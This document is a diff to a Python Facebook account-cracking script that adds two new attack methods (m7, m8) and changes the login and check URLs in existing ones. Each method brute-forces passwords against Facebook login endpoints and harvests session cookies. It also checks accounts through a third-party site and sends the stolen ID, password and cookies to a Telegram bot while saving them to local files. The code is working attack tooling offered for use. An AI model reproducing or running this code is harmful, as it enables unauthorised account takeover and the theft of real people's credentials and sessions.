@@ -725,7 +725,7 @@ def NUM():
  #if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
   #else:cokix.append('n')
   clear();banner();print(f"{dot}{P}SIM CODE  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
-  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}M5{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}M6{P}]');print(led)
+  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}M5{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}M6{P}]');print(f' {K}[{H}7{K}] {P}Method [{H}M7{P}]');print(f' {K}[{H}8{K}] {P}Method [{H}M8{P}]');print(led)
   hc = input(f'{wt}Select Method {M}:{H} ')
   if hc in ['1','01']:mtd.append('m1')
   elif hc in ['2','02']:mtd.append('m2')
@@ -733,6 +733,8 @@ def NUM():
   elif hc in ['4','04']:mtd.append('m4')
   elif hc in ['5','05']:mtd.append('m5')
   elif hc in ['6','06']:mtd.append('m6')
+  elif hc in ['7','07']:mtd.append('m7')
+  elif hc in ['8','08']:mtd.append('m8')
   else:
       mtd.append('m1')
   for nmbr in range(limit):
@@ -752,6 +754,8 @@ def NUM():
       elif 'm4' in mtd:king_xd.submit(m4,idf,pwv)
       elif 'm5' in mtd:king_xd.submit(m5,idf,pwv)
       elif 'm6' in mtd:king_xd.submit(m6,idf,pwv)
+      elif 'm7' in mtd:king_xd.submit(m7,idf,pwv)
+      elif 'm8' in mtd:king_xd.submit(m8,idf,pwv)
       else:
        king_xd.submit(m5,idf,pwv)
   print('');print(f'{N} Hi Dear User Crack process has been completed')
@@ -771,7 +775,7 @@ def digittt():
   #if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
   #else:cokix.append('n')
   clear();banner();print(f"{dot}{P}SIM CODE  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
-  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}M5{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}M6{P}]');print(led)
+  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}M5{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}M6{P}]');print(f' {K}[{H}7{K}] {P}Method [{H}M7{P}]');print(f' {K}[{H}8{K}] {P}Method [{H}M8{P}]');print(led)
   hc = input(f'{wt}Select Method {M}:{H} ')
   if hc in ['1','01']:mtd.append('m1')
   elif hc in ['2','02']:mtd.append('m2')
@@ -779,6 +783,8 @@ def digittt():
   elif hc in ['4','04']:mtd.append('m4')
   elif hc in ['5','05']:mtd.append('m5')
   elif hc in ['6','06']:mtd.append('m6')
+  elif hc in ['7','07']:mtd.append('m7')
+  elif hc in ['8','08']:mtd.append('m8')
   else:
       mtd.append('m1')
   for nmbr in range(limit):
@@ -797,6 +803,8 @@ def digittt():
       elif 'm4' in mtd:king_xd.submit(m4,idf,pwv)
       elif 'm5' in mtd:king_xd.submit(m5,idf,pwv)
       elif 'm6' in mtd:king_xd.submit(m6,idf,pwv)
+      elif 'm7' in mtd:king_xd.submit(m7,idf,pwv)
+      elif 'm8' in mtd:king_xd.submit(m8,idf,pwv)
       else:
        king_xd.submit(m5,idf,pwv)
   print('');print(f'{N} Hi Dear User Crack process has been completed')
@@ -816,7 +824,7 @@ def mix():
   #if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
  #else:cokix.append('n')
   clear();banner();print(f"{dot}{P}SIM CODE  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
-  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}M5{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}M6{P}]');print(led)
+  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}M5{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}M6{P}]');print(f' {K}[{H}7{K}] {P}Method [{H}M7{P}]');print(f' {K}[{H}8{K}] {P}Method [{H}M8{P}]');print(led)
   hc = input(f'{wt}Select Method {M}:{H} ')
   if hc in ['1','01']:mtd.append('m1')
   elif hc in ['2','02']:mtd.append('m2')
@@ -824,6 +832,8 @@ def mix():
   elif hc in ['4','04']:mtd.append('m4')
   elif hc in ['5','05']:mtd.append('m5')
   elif hc in ['6','06']:mtd.append('m6')
+  elif hc in ['7','07']:mtd.append('m7')
+  elif hc in ['8','08']:mtd.append('m8')
   else:
       mtd.append('m1')
   for nmbr in range(limit):
@@ -842,6 +852,8 @@ def mix():
       elif 'm4' in mtd:king_xd.submit(m4,idf,pwv)
       elif 'm5' in mtd:king_xd.submit(m5,idf,pwv)
       elif 'm6' in mtd:king_xd.submit(m6,idf,pwv)
+      elif 'm7' in mtd:king_xd.submit(m7,idf,pwv)
+      elif 'm8' in mtd:king_xd.submit(m8,idf,pwv)
       else:
        king_xd.submit(m5,idf,pwv)
   print('');print(f'{N} Hi Dear User Crack process has been completed')
@@ -860,7 +872,7 @@ def xp():
   if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
   else:cokix.append('n')
   clear();banner();print(f"{dot}{P}Number  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
-  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}m5{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}m6{P}]');print(led)
+  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}m5{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}m6{P}]');print(f' {K}[{H}7{K}] {P}Method [{H}m7{P}]');print(f' {K}[{H}8{K}] {P}Method [{H}m8{P}]');print(led)
   hc = input(f'{wt}Select Method {M}:{H} ')
   if hc in ['1','01']:mtd.append('m1')
   elif hc in ['2','02']:mtd.append('m2')
@@ -868,6 +880,8 @@ def xp():
   elif hc in ['4','04']:mtd.append('m4')
   elif hc in ['5','05']:mtd.append('m5')
   elif hc in ['6','06']:mtd.append('m6')
+  elif hc in ['7','07']:mtd.append('m7')
+  elif hc in ['8','08']:mtd.append('m8')
   else:
       mtd.append('m1')
   for nmbr in range(limit):
@@ -886,6 +900,8 @@ def xp():
       elif 'm4' in mtd:king_xd.submit(m4,idf,pwv)
       elif 'a1' in mtd:king_xd.submit(M5,idf,pwv)
       elif 'M1' in mtd:king_xd.submit(M6,idf,pwv)
+      elif 'm7' in mtd:king_xd.submit(m7,idf,pwv)
+      elif 'm8' in mtd:king_xd.submit(m8,idf,pwv)
       else:
        king_xd.submit(m5,idf,pwv)
   print('');print(f'{N} Hi Dear User Crack process has been completed')
@@ -1129,7 +1145,7 @@ def m4(idf,pwv):
   for ps in pwv:
    session = requests.Session()
    ua = random.choice(usragent)
-   free_fb = session.get('https://m.facebook.com').text
+   free_fb = session.get('https://lm.facebook.com').text
    log_data ={'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': idf,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': ps,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
    header_freefb =  {
     'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
@@ -1143,16 +1159,16 @@ def m4(idf,pwv):
     'Sec-Fetch-User': '?1',
     'Sec-Fetch-Dest': 'document',
     'Cache-Control': 'max-age=0',
-    'Referer': 'https://m.facebook.com/',
+    'Referer': 'https://lm.facebook.com/',
     'DNT': '1',
     'Pragma': 'no-cache',
     'TE': 'Trailers', }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
-   lo = session.post('https://ko-kr.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=log_data,headers=header_freefb).text
+   lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     user = re.findall('c_user=(.*);xs', coki)[0]
-    url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
+    url = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={user}"
     reqx = requests.get(url).text
     if 'live' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
@@ -1162,10 +1178,10 @@ def m4(idf,pwv):
             open('/sdcard/ATOM-M4-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
-    if 'lock' in reqx:
+    if 'die' in reqx:
             print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            open('/sdcard/ATOM-M4-death-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
    elif 'checkpoint' in log_cookies:
@@ -1226,20 +1242,20 @@ def m5(idf,pwv):
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     user = re.findall('c_user=(.*);xs', coki)[0]
-    url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
+    url = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={user}"
     reqx = requests.get(url).text
     if 'live' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
             statusok = (f" {user} | {ps} | {coki} ")
             requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-            open('/sdcard/ATOM-M4-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            open('/sdcard/ATOM-M5-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
-    if 'lock' in reqx:
+    if 'die' in reqx:
             print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            open('/sdcard/ATOM-M5-death-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
    elif 'checkpoint' in log_cookies:
@@ -1313,7 +1329,7 @@ def m6(idf,pwv):
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     user = re.findall('c_user=(.*);xs', coki)[0]
-    url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
+    url = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={user}"
     reqx = requests.get(url).text
     if 'live' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
@@ -1325,10 +1341,10 @@ def m6(idf,pwv):
             f'''datr={''.join(random.choices(string.ascii_letters + string.digits + '_', k = 24))};'''
             'True'
             break
-    if 'lock' in reqx:
+    if 'die' in reqx:
             print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            open('/sdcard/ATOM-M6-death-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
    elif 'checkpoint' in log_cookies:
@@ -1345,7 +1361,134 @@ def m6(idf,pwv):
   
  except:
   pass 
+  
+def m7(idf,pwv):
+ global loop
+ global ok
+ global agents
+ animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
+ sys.stdout.write(f'\r{P} [{animasi}{N}-{H}M7{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
+ try:
+  for ps in pwv:
+   session = requests.Session()
+   ua = random.choice(usragent)
+   free_fb = session.get('https://m.facebook.com').text
+   log_data ={'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': idf,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': ps,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
+   header_freefb =  {
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Connection': 'keep-alive',
+    'Upgrade-Insecure-Requests': '1',
+    'Sec-Fetch-Site': 'same-origin',
+    'Sec-Fetch-Mode': 'navigate',
+    'Sec-Fetch-User': '?1',
+    'Sec-Fetch-Dest': 'document',
+    'Cache-Control': 'max-age=0',
+    'Referer': 'https://m.facebook.com/',
+    'DNT': '1',
+    'Pragma': 'no-cache',
+    'TE': 'Trailers', }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
+   lo = session.post('https://ko-kr.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=log_data,headers=header_freefb).text
+   log_cookies=session.cookies.get_dict().keys()
+   if 'c_user' in log_cookies:
+    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+    user = re.findall('c_user=(.*);xs', coki)[0]
+    url = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={user}"
+    reqx = requests.get(url).text
+    if 'live' in reqx:
+            print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
+            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
+            statusok = (f" {user} | {ps} | {coki} ")
+            requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+            open('/sdcard/ATOM-M7-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            ok+=1 
+            break
+    if 'die' in reqx:
+            print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
+            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
+            open('/sdcard/ATOM-M7-death-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            ok+=1 
+            break
+   elif 'checkpoint' in log_cookies:
+    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+    coki1 = coki.split("1000")[1]
+    uid = "1000"+coki1[0:11]
+    if 'y' in cp_xdx:
+     print(f'\r{P} [\033[1;30mATOM-CP.txt{P}] \033[1;30m{uid}|{ps}{xxx}')
+    open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+ps+'|'+'\n')
+    cp.append(uid)
+   else:
+    continue
+  loop+=1
+  
+ except:
+  pass 
 
+def m8(idf,pwv):
+ global loop
+ global ok
+ global agents
+ animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
+ sys.stdout.write(f'\r{P} [{animasi}{N}-{H}M8{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
+ try:
+  for ps in pwv:
+   session = requests.Session()
+   ua = random.choice(usragent)
+   free_fb = session.get('https://m.facebook.com').text
+   log_data ={'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': idf,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': ps,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
+   header_freefb =  {
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Connection': 'keep-alive',
+    'Upgrade-Insecure-Requests': '1',
+    'Sec-Fetch-Site': 'same-origin',
+    'Sec-Fetch-Mode': 'navigate',
+    'Sec-Fetch-User': '?1',
+    'Sec-Fetch-Dest': 'document',
+    'Cache-Control': 'max-age=0',
+    'Referer': 'https://m.facebook.com/',
+    'DNT': '1',
+    'Pragma': 'no-cache',
+    'TE': 'Trailers', }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
+   lo = session.post('https://ko-kr.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=log_data,headers=header_freefb).text
+   log_cookies=session.cookies.get_dict().keys()
+   if 'c_user' in log_cookies:
+    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+    user = re.findall('c_user=(.*);xs', coki)[0]
+    url = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={user}"
+    reqx = requests.get(url).text
+    if 'live' in reqx:
+            print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
+            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
+            statusok = (f" {user} | {ps} | {coki} ")
+            requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+            open('/sdcard/ATOM-M8-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            ok+=1 
+            break
+    if 'die' in reqx:
+            print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
+            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
+            open('/sdcard/ATOM-M8-death-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            ok+=1 
+            break
+   elif 'checkpoint' in log_cookies:
+    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+    coki1 = coki.split("1000")[1]
+    uid = "1000"+coki1[0:11]
+    if 'y' in cp_xdx:
+     print(f'\r{P} [\033[1;30mATOM-CP.txt{P}] \033[1;30m{uid}|{ps}{xxx}')
+    open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+ps+'|'+'\n')
+    cp.append(uid)
+   else:
+    continue
+  loop+=1
+  
+ except:
+  pass 
 # INDIA X PAKISTAN -- MAIN DEF #
 
 if __name__=='__main__':
